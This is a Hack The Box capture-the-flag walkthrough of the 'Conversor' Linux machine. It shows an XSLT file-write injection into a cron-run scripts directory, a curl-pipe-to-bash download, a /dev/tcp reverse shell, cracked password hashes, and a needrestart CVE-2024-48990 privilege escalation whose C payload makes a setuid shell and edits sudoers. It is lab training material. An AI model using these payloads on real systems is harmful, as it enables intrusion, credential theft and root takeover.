---
icon: linux
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# Conversor Season 9 Machine Walk-through

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

***

_Welcome! This write-up walks through the_ **Conversor** _season 9 machine on Hack The Box. My goal is simple: stay motivated, record what I learn, and explain each step so the techniques and concepts stick. Follow along, replicate the steps, and level up your skills._

#### About Machine

#### Machine Info

* **Machine Name:** Conversor
* **Machine OS: Linux**
* **Difficulty:** Easy
* Machine Link: \[[https://app.hackthebox.com/machines/Conversor](https://app.hackthebox.com/machines/Conversor)]

#### Initial Scanning:

```bash
nmap -p- -A -sC -vv --min-rate 10000 10.10.11.92 -oN scan.txt

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9JqBn+xSQHg4I+jiEo+FiiRUhIRrVFyvZWz1pynUb/txOEximgV3lqjMSYxeV/9hieOFZewt/ACQbPhbR/oaE=
|   256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIR1sFcTPihpLp0OemLScFRf8nSrybmPGzOs83oKikw+
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/13%OT=22%CT=1%CU=34963%PV=Y%DS=2%DC=T%G=Y%TM=6915BC
OS:D4%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST
OS:11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 15.247 days (since Wed Oct 29 10:45:15 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   67.10 ms 10.10.14.1
2   67.11 ms 10.10.11.92
```

Add `conversor.htb` to `/etc/hosts`:

```bash
sudo echo "10.10.11.92 conversor.htb" | sudo tee -a /etc/hosts 
```

Lets explore web site:

<figure><img src="https://cdn-images-1.medium.com/max/800/1*tPPM3hDPICV0KDv_o24OHw.png" alt=""><figcaption></figcaption></figure>

After register/Login we see this:

<figure><img src="https://cdn-images-1.medium.com/max/800/1*pHW06zNPTCm74VIHg05TCw.png" alt=""><figcaption></figcaption></figure>

After many research we see that the `/about` page allowed to download source code.&#x20;

<figure><img src="https://cdn-images-1.medium.com/max/800/1*VU-6S_4uW0PTz0FxcQlx3Q.png" alt=""><figcaption></figcaption></figure>

We download and extract it to analysis:

<figure><img src="https://cdn-images-1.medium.com/max/800/1*NPFuhfaOXm5ftFkhHliyIA.png" alt=""><figcaption></figcaption></figure>

And we found an users.db from `instance/users.db` :

<figure><img src="https://cdn-images-1.medium.com/max/800/1*QcvMdJjM9N4DSQoKrANQXw.png" alt=""><figcaption></figcaption></figure>

Enumerate `users.db` file using SQLite:

```bash
sqlite3 users.db
.tables
.schema users
select * from users; 
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*x56dJDniNdIir_HOIGLYrw.png" alt=""><figcaption></figcaption></figure>

But we could not find anything.

Lets try to directory listing:

```bash
gobuster dir -u http://conversor.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobusetr.txt -t 50

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://conversor.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 2842]
/login                (Status: 200) [Size: 722]
/register             (Status: 200) [Size: 726]
/javascript           (Status: 301) [Size: 319] [--> http://conversor.htb/javascript/]
/logout               (Status: 302) [Size: 199] [--> /login]
/convert              (Status: 405) [Size: 153]
/server-status        (Status: 403) [Size: 278]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

**Explore and Understanding the converter feature — XML + XSLT**

The `/convert` endpoint takes:

* an XML file (data)
* an XSLT stylesheet (presentation)

XSLT is a transformation language for XML; it can include extension functions (EXSLT) that allow file writing or system interactions in some processors. When the app accepts both XML and XSLT and processes them with permissive processors or risky extension namespaces, this becomes a remote code / file write vector.

If the XSLT engine supports EXSLT’s `document()` or similar extension that writes files, an attacker can craft XSLT that **writes files** into webroot or other writable directories.

Previously we see that the app’s installation docs revealed a cron job:

```bash
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

It means any Python file placed in `/var/www/conversor.htb/scripts/` will be executed by root's cron (actually by `www-data` user's cron context) every minute — a powerful persistence/execution point if an attacker can write into that directory.

**Exploit**

We need to a xml file to upload application’s endpoints.&#x20;

Here we use nmap scan result.

```bash
nmap -A 10.10.11.92 -oX NmapScan.xml
```

Upload the `NmapScan.xml` scan output together with the `nmap.xslt` stylesheet to generate a polished, human-readable Nmap scan report.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*afVhO-ZMjCbbsaUDTpptgQ.png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://cdn-images-1.medium.com/max/800/1*OvOfKGhgUbZNUoITd8DT3g.png" alt=""><figcaption></figcaption></figure>

Prepare `shell.xslt`, bind the EXSLT-Common namespace to the `shell` prefix, and include a file reference to submit the Python payload.

```bash
EXSLT-Common
https://exslt.github.io/exsl/index.html
```

Prepare a `shell.sh` payload and host it using a lightweight Python HTTP server for controlled delivery.

```bash
shell.sh

#!/bin/bash
bash -i >& /dev/tcp/10.10.14.172/4444 0>&1
python3 -m http.server 80
```

Create a **Shell.xslt file :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell"
    version="1.0"
>
  <xsl:template match="/">
    <shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl 10.10.14.172/shell.sh|bash")
    </shell:document>
  </xsl:template>
</xsl:stylesheet>
```

Now start Netcat listener:

```bash
rlwrap -cAr nc -lnvp 4444
```

New try to upload `NmapScan.xml` and `Shell.xslt`:

<figure><img src="https://cdn-images-1.medium.com/max/800/1*lQ7N8dwo1tJQri-23drfQw.png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://cdn-images-1.medium.com/max/800/1*eC2cjDY7xXSCSauhbXXSEg.png" alt=""><figcaption></figcaption></figure>

After uploading `NmapScan.xml` and `shell.xslt`, the uploaded file was accessed by the application; a scheduled job subsequently processed the file and resulted in an interactive shell being obtained.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*zpiW1oPVzPq6zjmyXukJag.png" alt=""><figcaption></figcaption></figure>

After many analysis we found a users.db file from conversor.htb/instance/users.db.

we connect with sqilite3 and found this:

```bash
sqlite3 users.db
.tables
select * from users;
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*UZATGG5Pj3gxlZIgh--W5Q.png" alt=""><figcaption></figcaption></figure>

```
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|cisco|4297f44b13955235245b2497399d7a93
6|admin|21232f297a57a5a743894a0e4a801fc3
7|test|202cb962ac59075b964b07152d234b70
```

Now we use [Crackstation.net](https://crackstation.net/) to crack the password.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*hRs7npGH4UhA0F9N6KIQvw.png" alt=""><figcaption></figcaption></figure>

&#x20;Now we got a valid credentials for ssh login. Now we try to to connect ssh using the credential:

```
fismathack:Keepmesafeandwarm
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*w8nZmXWPzFGF0uVjtjlgsQ.png" alt=""><figcaption></figcaption></figure>

And we successfully get user flag.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*e5f2x_gFhNSFaeOo0GVm2Q.png" alt=""><figcaption></figcaption></figure>

Now, for privilege escalation, we enumerate the system and found this:

<figure><img src="https://cdn-images-1.medium.com/max/800/1*VpgDFefp8V9-49pAv-fzHA.png" alt=""><figcaption></figcaption></figure>

It means the user can run `needrestart` as root without supplying a password.

**What is `needrestart`?**

`needrestart` is a tool that inspects which processes need restarting after package updates. It may import Python modules or execute Python code during its checks in some versions.

After many research we see that the `needrestart` version is vulnerable (e.g., `v3.7` in this box).

<figure><img src="https://cdn-images-1.medium.com/max/800/1*iLby_AGkMDC_TuqFQKY_wg.png" alt=""><figcaption></figcaption></figure>

A vulnerability identified as [**CVE-2024–48990**](https://nvd.nist.gov/vuln/detail/CVE-2024-48990) (affecting `needrestart` versions before the fix) allowed a local attacker to control Python import behavior in a way that caused `needrestart` — when run with elevated privileges — to import attacker-controlled modules. Because Python resolves imports based on `sys.path` and `PYTHONPATH`, creating a specially named package in a location included in import resolution could lead to code running with root privileges.

CVE-2024–48990 can be leveraged to achieve remote code execution. The target environment does not include a native C compiler, so any exploit components requiring native compilation would need to be built externally and transported to the host prior to execution.

We use this PoC to Exploit [\[https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing](https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing)].

```bash
git clone https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing
cd CVE-2024-48990-PoC-Testing
```

We create a lib.c file in our local machine:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void a() __attribute__((constructor));

void a() {
    if (geteuid() == 0) {  // Only execute if we're running with root privileges
        setuid(0);
        setgid(0);
        const char *shell = "cp /bin/sh /tmp/poc; "
                            "chmod u+s /tmp/poc; "
                            "grep -qxF 'ALL ALL=NOPASSWD: /tmp/poc' /etc/sudoers || "
                            "echo 'ALL ALL=NOPASSWD: /tmp/poc' | tee -a /etc/sudoers > /dev/null &";
        system(shell);
    }
}

/* gcc: I use ARM64 (aarch64) so need cross compile.
   If you use Ubuntu x86_64, use:
     gcc -shared -fPIC -o __init__.so lib.c
*/
gcc -shared -fPIC -o __init__.so lib.c  
```

Then run the following commands:

```bash
gcc -shared -fPIC -o _init_.so lib.c
```

Modify `runner.sh` to remove the on-host `lib.c` compilation step and replace the `gcc` invocation with a `curl` retrieval of the precompiled `__init__.so` artifact.

```bash
runner.sh

#!/bin/bash
set -e
cd /tmp
mkdir -p malicious/importlib

#chage to your ip and open python http server
curl http://10.10.14.172:8000/__init__.so -o /tmp/malicious/importlib/__init__.so

# Minimal Python script to trigger import
cat << 'EOF' > /tmp/malicious/e.py
import time
while True:
    try:
        import importlib
    except: 
        pass
    if __import__("os").path.exists("/tmp/poc"):
        print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")
        __import__("os").system("sudo /tmp/poc -p")
        break    
    time.sleep(1)
EOF

cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
```

A crafted payload was delivered to the target host

Start python server:

```bash
python3 -m http.server 
```

Download payload on remote machine:

```bash
wget http://10.10.14.172:8000/runner.sh
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*MGd-Myez3bN6Ny8NB--gbQ.png" alt=""><figcaption></figcaption></figure>

Now change the permission and execute the command:

```bash
chmod +x runner.sh
./runner.sh
```

Following execution of the modified `runner.sh`, a subsequent privileged command (`/usr/sbin/needrestart`) was executed from a secondary SSH session, resulting in a root-level shell.

Open new terminal and connect with ssh and run the command:

```bash
sudo /usr/sbin/needrestart
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*5oxyhWFHC7f2O2w5eOz7Kw.png" alt=""><figcaption></figcaption></figure>

Now we successfully get a root privilege and root flag.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*rv7Ykr1aFCz_K8DKO3kngQ.png" alt=""><figcaption></figcaption></figure>

***

> _I hope you enjoyed this writeup! Happy Hacking :)_
>
> _Follow to me on Medium and be sure to turn on email notifications so you never miss out on my latest informative posts._

#### Follow me on below Social Media:

1. _**LinkedIn:**_ [_**Subhadip Sardar**_](http://linkedin.com/in/subhadip-sardar)
2. _**Twitter | X :**_ [_**@Mr\_SubhaDip03**_](https://x.com/Mr_SubhaDip03)
3. _**GitHub :**_ [_**SubhaDip003**_](https://github.com/SubhaDip003)
4. _**Check My TryHackMe Profile :**_ [_**TryHackMe | SubhaDip**_](https://tryhackme.com/r/p/SubhaDip)
5. _**Check My HackTheBox Profile:**_ [_**Hack The Box | SubhaDip03**_](https://app.hackthebox.com/profile/1658126)
